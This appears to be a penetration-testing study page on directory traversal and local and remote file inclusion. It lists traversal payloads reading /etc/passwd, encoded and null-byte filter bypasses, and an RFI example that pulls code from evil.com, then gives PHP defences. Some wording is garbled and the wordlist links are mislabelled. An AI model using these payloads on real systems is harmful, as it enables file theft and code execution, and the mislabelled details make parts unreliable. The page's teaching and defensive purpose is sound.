---
description: >-
  The attacker tricks the web application into read and execute files on the
  server.
---

# FILE INCLUSION

#### URL

> * Uniform Resource Locator (URL) it has several components including protocol, host, port, file path, query parameters and fragments.
>   * Uniform >> Constant >> Same.
>   * Resources >> Client Maternal or Available in internet.
>   * Locator >> This provides access.&#x20;
>   * **`Protocol://Host:Port/File?`**`(?>>query)file(file >> Variable)`**`=Filename`**`(value`**`).extension&`**`(Extravariable)`**`id=3#`**`(fragments)`**`TOP`**`(Valueofpage,handle page Location)`
>     * Example: `https://example.com:8080/path/to/resource?query=param#section`
>   * The Path may be very based on server or the software host in the web application.

## Directory Traversal

> An Attacker tricks the web application file path into access unintended files outside of its intended directory

#### What is Directory Traversal

> * A web application where images are hosted when click the image its redirect to the image link
>   * Like: `<img src="/localimage?filename=218.png">`
> * This shows where the image is fetch and loaded the image using image filename. "`218.png`"
> * These images are stored on the server in a location like "`var/www/images`"&#x20;
> * How ever the vulnerability is when the file path is user controllable on the client side or not validate by that server.
> * An attacker trick the web application filename parameters into displaying file it should not.
>   * Example: `https://webapplication.com/loadimage?filename="218.png`
>   * Attacker Tricks : `https://webapplication.com/loadimage?filename=../.././etc/passwd`
>   * Attacker Example: `https://webapplication.com/loadimage?filename=../../../windows/win.ini`
>   * The Dot & Slash are operating system command of backing into one directory so instead of being at images directory its goes into the 3 times back in the directory which is root directory. after that its goes forward into the `/etc` directory then `passwd` file.
>   * On Unix-based `(linux) "/etc/passwd`" is a file which contain user details & access sensitive information like "win.ini"
>   * The same example applies in windows.

### Encoding

URL Encoding

> Encoding with all the slashes and dots.
>
> * dot >> `%2e`
> * Forward Slash >> `%2f`
> * back slash >> `%5c`
> * Example: `%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5c%2e%2e%5cetc%5cpasswd`

Double Encoding

> * dot >> `%252e`
> * forward slash >> `%252f`
> * back slash >> `%255c`
> * Example: `%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd`

UTF-8 Encoding

> * Dot >> `%c0%2e %e0%40%ae %c0ae etc.`
> * Forward slash >> `%c0%af %e0%80%af %c0%2f etc.`
> * Back slash >> `%c0%5c %c0%80%5c etc.`



## File Inclusion

> An Attacker tricks the web application into reading and executing files on the servers. These are two types of Vulnerability LFI & RFI.

### Types

> * Local File Inclusion (LFI): Allows an attacker to read local files on the web server using malicious web request.
> * Remote File Inclusion (RFI): Allows an attacker to include file from attacker server which results in executing code.

LFI

> Attackers trick the web application to load files which results in reading and access sensitive information.
>
> How It Works:
>
> > * attacker tricked the URL input function and added unintended files path.
> >   * `https://example.com/home.php?files=../../../etc/passwd`
> > * The web application loads the path which results in attacker can access the sensitive information on the server

RFI

> Attackers trick the web application to add and execute files from an external server which results in executing hosted external server malicious code.
>
> How it Works
>
> > * Attacker tricked the URL input function and added the unintended file path of a remote server
> >   * `https://example.com/home.php?file=https://evil.com/badcode.php`
> > * the web application loads the path and attacker can access the malicious code.

#### Word List

> Windows
>
> > [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/file\_inclusion\_linux.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt)
>
> Linux
>
> > [https://github.com/carlospolop/Auto\_Wordlists/blob/main/wordlists/file\_inclusion\_windows.txt](https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt)

### Blackbox

> * Replace string can be bypass by Double string
>   * This str\_replace will `../`,and `..\\` with spaces&#x20;
>   * The attacker can by passs by `<scri<script>pt>` or `…/./…/./…/./…/./`, where the initials backslash or script tag is replaced, and the inner script tag and backslash remain.
>   * Use PayloadAllTheThinks wordlist and `FUZZ`&#x20;
>
> ```php
> <?php
> $file = str_replace( array( "http://", "https://" ), "", $file );
> $file = str_replace( array( "../", "..\\" ), "", $file );
> ?>
> ```
>
> * Input Sanitization of Only PHP files are allowed then it's can be bypass by NULL Bytes.
>   * Its act like a string terminator which cut everything after it, while using URL Encoding its '%00'
>   * Original Intention
>     * The developer has sanitization of include file with a .php extention like page.php or home.php.
>   * Attacker Input using NULL Bytes
>     * the attacker input is '`../../etc/passwd%00.php`'
>       * The Null bytes '%00' will cut everything after it so it will remain `../../etc/passwd`
>   * File Inclusion
>     * The server attempts to include path '../../etc/passwd' instead of '`../../etc/passwd.php`'
> * Validation of file extension its allows certain files like .jpg/png to bypass this use the code `../../etc/passwd(space).jpg/.png >> ../../etc/passwd .png`
>   * `/image?filename=%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd%00%2ejpg`

Defense Against insecure File Path

> * SOP and Cross Domain will prevent it from Client-side not by servers' side
>
> LFI
>
> > * Input Validation And Sanitization
> >   * Characters like '../' are not allowed using the $allowed\_files=\['page1.php' , page2.php']
> >
> > ```php
> > // Unsanitized input
> > $file = $_GET['file'];
> > include($file);
> >
> > // Sanitized input
> > $file = basename($_GET['file']); // Only the file name, no paths
> > $allowed_files = ['page1.php', 'page2.php'];
> >
> > if (in_array($file, $allowed_files)) {
> >     include($file);
> > } else {
> >     echo "File not allowed!";
> > }
> >
> > ```
> >
> > * Allows Specific Files
> >
> > ```
> > $allowed_files = ['about.php', 'contact.php', 'home.php'];
> > $file = $_GET['file'];
> > ```
> >
> > * Validate File Path
> >
> > ```php
> > $file = realpath($_GET['file']);
> >
> > if ($file && strpos($file, realpath('allowed_directory/')) === 0) {
> >     include($file);
> > } else {
> >     echo "Invalid file path!";
> > }
> > ```
>
> RFI
>
> > * Disable Remote Files Inclusions
> >
> > ```php
> > // php.ini settings
> > allow_url_fopen = Off
> > allow_url_include = Off
> > ```
> >
> > * Allows Specific Files and Validate the File Path.

## MindMap

{% file src="../../../.gitbook/assets/File Inclusion.pdf" %}
Insecure File Inclusion
{% endfile %}
